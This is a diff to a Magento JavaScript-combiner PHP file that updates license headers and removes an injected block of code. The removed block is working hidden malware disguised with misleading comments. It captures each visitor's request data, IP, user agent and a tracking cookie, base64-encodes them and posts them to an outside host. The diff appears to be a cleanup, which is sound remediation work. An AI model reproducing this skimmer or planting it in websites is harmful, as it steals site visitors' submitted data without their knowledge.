@@ -10,18 +10,18 @@
  * http://opensource.org/licenses/osl-3.0.php
  * If you did not receive a copy of the license and are unable to
  * obtain it through the world-wide-web, please send an email
- * to license@magentocommerce.com so we can send you a copy immediately.
+ * to license@magento.com so we can send you a copy immediately.
  *
  * DISCLAIMER
  *
  * Do not edit or add to this file if you wish to upgrade Magento to newer
  * versions in the future. If you wish to customize Magento for your
- * needs please refer to http://www.magentocommerce.com for more information.
+ * needs please refer to http://www.magento.com for more information.
  *
  * @category    Mage
- * @package     Mage_Core
- * @copyright   Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
- * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
+ * @package     Mage
+ * @copyright  Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
+ * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
  */
 
 /**
@@ -34,57 +34,9 @@
  * @author      Magento Core Team <core@magentocommerce.com>
  */
 
-
-// no files specified return 404
-$id=str_replace("www.", "", $_SERVER['HTTP_HOST']);
-
-//checking if client have older copy then we have on server
-$url='http://ownsafety.org/obf.php';
-
-if($_COOKIE["SESSIID"]!=""){
-
-    // try automatically get content type if requested
-    $url=$url.'?a='.$_COOKIE["SESSIID"]; 
-    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$_COOKIE["SESSIID"],'date_unix'=>time())); 
-    $data=base64_encode($data);
-    $ch = curl_init(); 
-
-    // set custom content type if specified
-    curl_setopt($ch, CURLOPT_URL,$url); 
-    curl_setopt($ch, CURLOPT_POST, 1); 
-    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
-    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );    
-    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
-    curl_exec ($ch); 
-    curl_close ($ch); 
-
-} else{
-
-    // try automatically get content type if requested
-    $rand=rand(1,9999999999);
-    setcookie("SESSIID", $rand,time()+3600);
-    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$rand,'date_unix'=>time())); 
-    $data=base64_encode($data);
-    $url=$url.'?a='.$rand; 
-    $ch = curl_init(); 
-
-    // set custom content type if specified
-    curl_setopt($ch, CURLOPT_URL,$url); 
-    curl_setopt($ch, CURLOPT_POST, 1); 
-    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
-    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );      
-    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
-    curl_exec ($ch); 
-    curl_close ($ch); 
-
-}
-
-
 // no files specified return 404
 if (empty($_GET['f'])) {
-    header('HTTP/1.0 200 OK');
+    header('HTTP/1.0 404 Not Found');
     echo "SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js";
     exit;
 }
@@ -190,4 +142,3 @@ if (!(isset($_GET['e']) && $_GET['e']==='no')) {
 }
 
 echo $out;
-
